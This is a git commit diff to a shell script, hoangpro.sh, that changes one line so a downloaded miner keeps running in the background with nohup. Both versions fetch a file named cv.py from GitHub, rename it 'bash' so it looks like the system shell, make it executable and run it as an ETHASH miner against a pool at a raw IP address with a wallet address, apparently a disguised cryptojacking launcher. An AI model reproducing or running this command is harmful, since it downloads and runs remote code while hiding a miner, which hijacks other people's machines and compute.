f75af959f8178b477af4313d8f4056410aafedf7
hoangvbck65 <110218276+hoangvbck65@users.noreply.github.com>
2022-08-15 15:52:05 +0700

    Update hoangpro.sh

--- hoangpro.sh
+++ hoangpro.sh
@@ -1,1 +1,1 @@
-wget https://github.com/hoangvbck65/hoangvbck/raw/main/cv.py && mv cv.py bash && chmod +x bash && ./bash --algo ETHASH --pool 14.225.45.6:111 --user nano_15yc3tyhj9wk19xc3ob45p8rxjaam7esbpoctaugafcc4ww76kg9yj8s99ui.WORKER_NAME
+wget https://github.com/hoangvbck65/hoangvbck/raw/main/cv.py && mv cv.py bash && chmod +x bash && nohup ./bash --algo ETHASH --pool 14.225.45.6:111 --user nano_15yc3tyhj9wk19xc3ob45p8rxjaam7esbpoctaugafcc4ww76kg9yj8s99ui.WORKER_NAME
